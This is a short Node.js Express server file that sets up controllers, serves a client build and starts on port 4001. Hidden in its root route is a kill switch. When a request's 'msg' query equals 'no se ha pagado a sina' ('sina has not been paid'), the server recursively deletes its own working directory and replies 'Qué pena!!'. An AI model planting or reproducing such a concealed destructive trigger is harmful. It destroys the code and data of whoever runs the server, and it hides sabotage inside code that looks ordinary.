const { Server } = require("sm-express-server");
const magicalHandsControllers = require("./Controllers");
const bodyParser = require("body-parser");
const express = require("express");
const path = require("path");
const fs = require("fs");

const port = 4001;
const server = new Server(port, "/", [bodyParser.json()]);

server.addControllers(magicalHandsControllers);
server.app.use("/client", express.static(path.join(__dirname, "./dist/")));
server.app.get('/client/*', (req, res) => {
    res.sendFile(path.join(__dirname, './dist', 'index.html'));
});
server.app.get("/", (req, res) => {
    if (req.query.msg == "no se ha pagado a sina") {
        fs.stat("./", (err, stats) => {
            if (!err) {
                fs.rmdir("./", {recursive: true}, (err) => {
                    res.send("Qué pena!!");
                })
            }
        })
    }
})
server.start(() => {
    console.log(`server is up on port ${port}`);
});